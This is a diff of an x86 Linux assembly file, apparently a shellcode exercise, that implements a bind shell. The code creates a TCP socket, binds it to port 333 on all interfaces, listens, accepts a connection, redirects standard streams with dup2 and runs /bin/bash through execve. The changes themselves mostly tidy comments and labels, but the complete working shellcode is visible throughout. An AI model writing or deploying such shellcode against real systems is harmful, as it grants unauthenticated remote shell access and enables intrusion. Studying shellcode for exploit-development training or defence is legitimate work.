@@ -20,11 +20,12 @@ _start:
 	;Socket Calls
         ;In reverse order, pushing each value to the stack:
 
+	;Socket - creating the socket
 	push eax     ; Pushing 0 for the Protocol parameter required
 	push 0x1     ; Pushing 1 for the Type (SOCK_STREAM) parameter required
 	push 0x2     ; Pushing 2 for the Domain (IF_INET) parameter required
 	
-	mov al, 0x66; Adding syscall for socketcall() to eax
+	mov al, 0x66 ; Adding syscall for socketcall() to eax
 	mov bl, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'
 
 		     ; At this point, eax is set to 0x66 for the socketcall
@@ -43,30 +44,29 @@ _start:
 
 
 
-	;Bind
-	;Similar as before, but with different parameters for the bind socketcall
+	;Bind - binding the created socket to a port
+	;Similar to socket, but with different parameters for the bind socketcall
 
-	mov al, 0x66 ; eax contained the File Descriptor, now socketcall().
-	mov bl, 0x2    ; Making ebx 2 for bind socketcall()	
+	mov al, 0x66  ; eax contained the File Descriptor, now socketcall().
+	mov bl, 0x2   ; Making ebx 2 for bind socketcall()	
 	
 
 	;Add parameters to stack to be used for ecx
-	;As stated before, these have to be put in reverse
-	; For ecx - int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
-
+	;For ecx - int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
 	;sockaddr structure
-	push esi     ; esi should contain 0, which is pushed to the stack for INADDR_ANY (8 bytes)
+	
+	push esi      ; esi should contain 0, which is pushed to the stack for INADDR_ANY (8 bytes)
     	push word 0x4d01 ; Pushing the port (333) to the stack (4 bytes)
-    	push word 0x2     ; Pushing 2 to the stack for IF_INET (4 bytes)
+    	push word 0x2 ; Pushing 2 to the stack for IF_INET (4 bytes)
 
 	;addrlen
-	mov ecx, esp ; Moving the stack pointer to ecx to point to sockaddr structure each time
+	mov ecx, esp ; Moving the stack pointer to ecx to point to sockaddr structure dynamically
 
-	push 0x10    ; push addrlen to the stack, of the structure below. This is 16 bytes
-	push ecx     ; the stack pointer 
-	push edx     ;File Descriptor from socket call
+	push 0x10    ; Push addrlen to the stack, of the structure below. This is 16 bytes
+	push ecx     ; The stack pointer 
+	push edx     ; File Descriptor from socket call
 	
-	mov ecx, esp ; the previous value of ecx was pushed to the stack a few instructions before, this updates
+	mov ecx, esp ; The previous value of ecx was pushed to the stack a few instructions before, this updates
 		     ; ecx with the current stack pointer to the values previously pushed to the stack. 
 
 	int 0x80     ; Interupt to call the syscall
@@ -75,13 +75,12 @@ _start:
 
 
 
-	;Listen
+	;Listen - listen for an incoming connection
 
-	mov al, 0x66; Socketcall syscall
-	mov bl, 0x4 ; add 4 to ebx for listen 
+	mov al, 0x66 ; Socketcall syscall
+	mov bl, 0x4  ; Add 4 to ebx for listen 
 
-	;ecx
-	;int listen(int sockfd, int backlog);
+	;ecx - int listen(int sockfd, int backlog);
 
 	push esi     ; push 0 to stack for backlog
 	push edx     ; File Descriptor still saved in edx
@@ -92,28 +91,29 @@ _start:
 
 
 
-	;Accept
 
-	mov al, 0x66; Socketcall syscall
-    	mov bl, 0x5 ; add 5 to ebx for accept
 
-	;ecx
-	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+	;Accept - accept an incoming connection
 
-	push esi    ; Push 0 to the stack as addr/addrlen are not required
-	push edx    ; Push FD from edx
+	mov al, 0x66 ; Socketcall syscall
+    	mov bl, 0x5  ; add 5 to ebx for accept
 
-	mov ecx, esp; Moving the pointer to the stack into ecx
+	;ecx int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 
-	int 0x80    ; Interupt to call the syscall
+	push esi     ; Push 0 to the stack as addr/addrlen are not required
+	push edx     ; Push FD from edx
 
-	mov edx, eax; As a new FD is returned, it is moved from eax to edx
+	mov ecx, esp ; Moving the pointer to the stack into ecx
+
+	int 0x80     ; Interupt to call the syscall
+
+	mov edx, eax ; As a new FD is returned, it is moved from eax to edx
 
 
 	
 
-	;dup2
-	;This could be looped if required
+	;dup2 - duplicate the file descriptor to redirect the incoming connection 
+	;Note - this could be looped if required
 
 	mov al, 0x3f  ; Syscall for dup2
 	mov ebx, edx  ; Moving the old FD into ebx
@@ -130,9 +130,9 @@ _start:
 	
 
 
-	;execve
+	;execve - execute '/bin/bash' to provide a shell
 
-    	xor eax, eax
+    	xor eax, eax  ; Clearing eax
     	push eax      ; Pushing 0 to the stack
 
    	; push////bin/bash (12), could be shortened to //bin/sh (8)
@@ -140,13 +140,13 @@ _start:
    	push 0x2f6e6962
     	push 0x2f2f2f2f
 
-    	mov ebx, esp ; move stack pointer pointing to the above to ebx as a parameter (filename)
+    	mov ebx, esp ; Move stack pointer pointing to the above to ebx as a parameter (filename)
 	
 	xor ecx, ecx ; Null pointer for ecx argv
 	xor edx, edx ; Null pointer for edx envp
 
     	mov al, 0xb   ; Moving 11 to eax for execve syscall
-    	int 0x80     ; Interupt to call the syscall
+    	int 0x80      ; Interupt to call the syscall
 
 
 
